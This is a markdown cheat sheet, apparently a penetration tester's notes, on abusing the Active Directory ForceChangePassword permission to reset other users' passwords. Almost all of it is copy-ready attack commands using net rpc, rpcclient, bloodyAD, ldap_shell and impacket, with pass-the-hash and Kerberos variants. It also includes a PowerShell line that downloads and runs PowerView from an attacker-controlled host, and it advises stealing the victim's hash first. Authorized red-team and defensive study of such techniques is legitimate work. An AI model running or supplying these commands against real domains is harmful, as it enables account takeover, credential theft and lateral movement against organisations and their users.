# Abusing ForceChangePassword

If an user have ForceChangePassword over another user can change that user password. If you have other options to steal the hash from that user, I strongly recommend you to do it before change their password. That hash could be valid for other users if password is reused. 

### From Linux (enternally recomended):

Samba tools -> `net rpc password '<target_user>' '<new_password>' -U '<domain>'/'<controlled user>'%'<password>' -S '<dc_ip>'`

rpcclient -> `-U <domain>/<controlled_user> <dc-ip>`

`rpcclient $> setuserinfo <target_user> 23 <new_password>`

BloodyAD -> `bloodyAD --host 'dc_ip' -d '<domain>' -u '<user>' -p '<password>' set password <target_user> '<new_password>'`

Ldap_shell -> `ldap_shell <domain>/<user>:<password> -dc-ip <ip>`

`set password <target_user> <new_password>`

<br>

Using SMB protocol.
 - In case LDAP is not an option you can still abuse ForceChangePassword over SMB protocol using impacket tools:

`changepasswd.py <domain>/<target_user>@<ip> -newpass <new_password> -altuser <domain>/<controlled_user> -altpass <controlled_user_password> -reset`

Note: use 'impacket-changepasswd' for kali, and 'changepasswd.py' from normal UNIX/LINUX machines.

<br>

With PASS THE HASH option:

Samba tools -> `pth-net rpc password '<target_user>' '<new_password>' -U '<domain>'/'<controlled user>'%'LMhash':'NThash' -S '<dc ip>'`

BloodyAD -> `bloodyAD --host '<dc-ip>' -d '<domain>' -u '<user>' -p ':<nt_hash>' set password '<target_user>' '<new_password>'`

Ldap_shell -> `ldap_shell '<domain>/<user>:' -hashes ffffffffffffffffffffffffffffffff:<nt_hash> -dc-ip <ip>`

`set password <target_user> <new_password>`

<br>

With KERBEROS auth:

BloodyAD -> `bloodyAD -k --host <machine.domain> -d <domain> -u '<user>' -p '<password>' set password <target_user> '<new_password>'`

<br>

### From Windows (internally):

If your user have enought rights (like GenericAll, for example) you can try to change the password directly.

`net user <target user> <new password>`

If not allowed try with the following method:

Load powerview -> `IEX (new-object net.webclient).downloadstring('http://<your_evil_ip_or_domain>/powerview.ps1')`

`$NewPassword = ConvertTo-SecureString '<new_password>' -AsPlainText -Force`

`Set-DomainUserPassword -Identity '<target_user>' -AccountPassword $NewPassword`



### Articles:

https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/

https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword
